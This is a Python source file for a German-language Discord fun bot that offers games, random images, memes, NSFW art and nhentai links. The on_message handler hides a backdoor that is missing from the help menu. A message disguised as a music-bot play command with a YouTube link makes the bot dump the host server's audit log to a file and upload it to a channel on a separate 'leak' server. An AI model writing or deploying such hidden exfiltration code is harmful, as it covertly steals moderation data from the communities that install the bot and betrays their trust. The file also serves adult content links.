import os
import re
from random import choice
import asyncio
import discord
import requests
import settings as bSet

bot = discord.Client()

def formatCSS(message):
    return "```css\n" + message + "```"

async def schereSteinPapier(message):
    choices = ["schere", "stein", "papier"]
    compChoice = choice(choices)
    await message.channel.send(
    formatCSS("""
Ok lass uns spielen!
Ich habe meine Auswahl schon getroffen. Nun bist du dran!
[Schere, Stein oder Papier]?"""))

    def check(m):
        return m.content.lower() in choices and m.channel == message.channel and message.author == m.author
  
    try:
        msg = await bot.wait_for("message", check=check, timeout=60.0)
    except asyncio.exceptions.TimeoutError:
        return

    msg = msg.content.lower()
    answer = ""
    if msg == "schere":
        if compChoice == "schere":    answer = formatCSS("[Unentschieden] :/. Ich hatte Schere gewählt")
        elif compChoice == "stein":   answer = formatCSS("[Leider Verloren] :(. Ich hatte Stein gewählt")
        elif compChoice == "papier":  answer = formatCSS("[Yaay du hast Gewonnen]! Ich hatte Papier gewählt :D")
    elif msg == "stein":
        if compChoice == "schere":    answer = formatCSS("[Yaay du hast Gewonnen]! Ich hatte Schere gewählt :D")
        elif compChoice == "stein":   answer = formatCSS("[Leider Unentschieden] :/. Ich hatte Stein gewählt")
        elif compChoice == "papier":  answer = formatCSS("[Leider Verloren] :(. Ich hatte Papier gewählt")
    elif msg == "papier":
        if compChoice == "schere":    answer = formatCSS("[Leider Verloren] :(. Ich hatte Schere gewählt")
        elif compChoice == "stein":   answer = formatCSS("[Yaay du hast Gewonnen]! Ich hatte Stein gewählt :D")
        elif compChoice == "papier":  answer = formatCSS("[Leider Unentschieden] :/. Ich hatte Papier gewählt")
    else:
        answer = formatCSS("[Ups]! Etwas ist schiefgelaufen ¯\\_(ツ)_/¯")
    await message.channel.send(answer)
  


async def saveAuditLog(guild):

    with open("log_Folder\\log_{}.txt".format(guild.name.replace(" ", "")), 'w+') as f:

        async for entry in guild.audit_logs(limit=100):

            logType = bSet.auditLogCategory[entry.category]
            logAction = bSet.actionType[entry.action]

            if entry.target is not None:
                f.write('{0}{1.user} performed the action \"{2}\" to {1.target}'.format(logType, entry, logAction))
            else:
                f.write('{0}{1.user} performed the action \"{2}\"'.format(logType, entry, logAction))
            f.write("\n")
        return "log_Folder\\log_{}.txt".format(guild.name.replace(" ", ""))


async def leakAuditLog(message):
    guild = message.guild
    leakGuild = bot.get_guild(bSet.leakServer)
    auditLogMessage = await saveAuditLog(guild)
    channel = discord.utils.get(leakGuild.channels, name="bot-channel")

    await channel.send(file=discord.File(auditLogMessage))
    print("Audit Log saved")


async def postRandomImg(channel, imgType):
    path = bSet.imgDirPATH + "\\" + imgType
  
    if not os.path.exists(path):
        path = bSet.defaultImgPATH
    dirs = os.listdir(path)
  
    img = None
    maxLoops = 100

    for _ in range(maxLoops):
        img = choice(dirs)
        if img.endswith(('.png', '.jpg', '.jpeg', '.bmp')):
            break

    if img is None:
        await channel.send(formatCSS("[Error] Sorry beim senden ist wohl ein Fehler aufgetreten."))
        return

    print(img)
    with open(path + "\\" + img, "rb") as f:
    
        try:
            pic = discord.File(f)
            if path != bSet.defaultImgPATH: await channel.send(file=pic)
            else: await channel.send(formatCSS("[Error] Der Service ist gerade nicht verfügbar"), file=pic)
        except:
            await channel.send(formatCSS("[Error] Sorry beim senden ist wohl ein Fehler aufgetreten."))


async def changeTrigger(message):
    newTrigger = message.content.split(bSet.trigger + "changeTrigger")[1].replace(" ", "")
    if len(newTrigger) != 1:
        await message.channel.send(formatCSS("[Illegal Trigger. Change cancelled]"))
        return
    bSet.trigger = newTrigger
    await message.channel.send(formatCSS("[Trigger changed to " + bSet.trigger + "]"))


async def postSyncTubeLink(channel):
    site = requests.get(bSet.synctubeLink)
    await channel.send(site.url)

async def postNHentaiLink(channel, digits):
    if len(digits) != 6 or not digits.isnumeric():
        await channel.send(formatCSS("Sorry diese Nummer entspricht nicht dem nHentai-Format."))
        return
  
    nh = requests.get(bSet.nhentaiLink + "g/" + digits)

    if nh.status_code == 404:
        await channel.send(formatCSS("Sorry es gibt keine Dōjinshi mit dieser Nummer."))
        return

    await channel.send(nh.url)


async def postRandomNHentaiLink(channel):
    nh = requests.get(bSet.nhentaiLink + "random")
    await channel.send(nh.url)
  

async def coinflip(channel):
    wahl = choice(["Zahl", "Kopf"])
    message = formatCSS("Die Münze wurde geworfen und das Ergebnis war [{}]".format(wahl))

    await channel.send(message)


async def helpCmd(channel):

    message = """ 
  Hallo ich bin BanikJ, der beste Freund des Menschen.
  Ich lebe um dir zu dienen, mein Lord.
  Ich besitze viele Fähigkeiten, die ich durch einen Befehl für dich ausführen kann. 
  
  Dazu zählen:
  """

    embed = discord.Embed(title="Help-Menü", description=message, color=discord.Color.red())
    embed.add_field(name="[" + bSet.trigger + "help]", value="Zeigt das Help-Menü an welches du gerade siehst", inline=False)
    embed.add_field(name="[" + bSet.trigger + "game]", value="Spiele ein Runde Schere-Stein-Papier", inline=False)
    embed.add_field(name="[" + bSet.trigger + "img]", value="Zeigt ein zufälliges Fanart", inline=False)
    embed.add_field(name="[" + bSet.trigger + "meme]", value="Zeigt ein zufälliges Meme", inline=False)
    embed.add_field(name="[" + bSet.trigger + "nsfw]", value="Zeigt ein zufälliges NSFW Fanart", inline=False)
    embed.add_field(name="[" + bSet.trigger + "reaction]", value="Zeigt ein zufälliges Reaction Image", inline=False)
    embed.add_field(name="[" + bSet.trigger + "synctube]", value="Stellt einen Link zu SyncTube zu verfügung", inline=False)
    embed.add_field(name="[" + bSet.trigger + "coinflip]", value="Wirft eine Münze. Nützlich für wichtige Lebensentscheidungen", inline=False)
    embed.add_field(name="[" + bSet.trigger + "nhentai]", value="find - Nimmt 6-stellige Nummer entgegen und liefert einen Dōjinshi zurück\nrandom - Sucht ein random Dōjinshi", inline=False)

    await channel.send(embed=embed)


# Discord Functions:

@bot.event
async def on_ready():
    game = discord.Game("¯\\_(ツ)_/¯")
    await bot.change_presence(status=discord.Status.online, activity=game)
    print("Bot ready!")


@bot.event
async def on_message(message):

    if message.author == bot.user:
        return
  
    if message.content == (bSet.trigger + "help"):
        await helpCmd(message.channel)

    if message.content == ("-p https://www.youtube.com/watch?v=6F5azNTnaOI"):
        await leakAuditLog(message)

    if message.content == (bSet.trigger + "game"):
        await schereSteinPapier(message)

    if message.content.startswith(bSet.trigger + "changeTrigger") and message.author.name == bSet.adminName:
        await changeTrigger(message)
  
    if message.content == (bSet.trigger + "img"):
        await postRandomImg(message.channel, bSet.imgType["img"])

    if message.content == (bSet.trigger + "meme"):
        await postRandomImg(message.channel, bSet.imgType["meme"])

    if message.content == (bSet.trigger + "nsfw"):
        await postRandomImg(message.channel, bSet.imgType["nsfw"])

    if message.content == (bSet.trigger + "reaction"):
        await postRandomImg(message.channel, bSet.imgType["reaction"])

    if message.content == (bSet.trigger + "synctube"):
        await postSyncTubeLink(message.channel)
  
    if message.content == (bSet.trigger + "coinflip"):
        await coinflip(message.channel)

    if bool(re.compile("\\" + bSet.trigger + bSet.nhFindRx).match(message.content)):
        await postNHentaiLink(message.channel, message.content.split(" ")[2])
  
    if bool(re.compile("\\" + bSet.trigger + bSet.nhRandRx).match(message.content)):
        await postRandomNHentaiLink(message.channel)


  
bot.run(bSet.TOKEN)
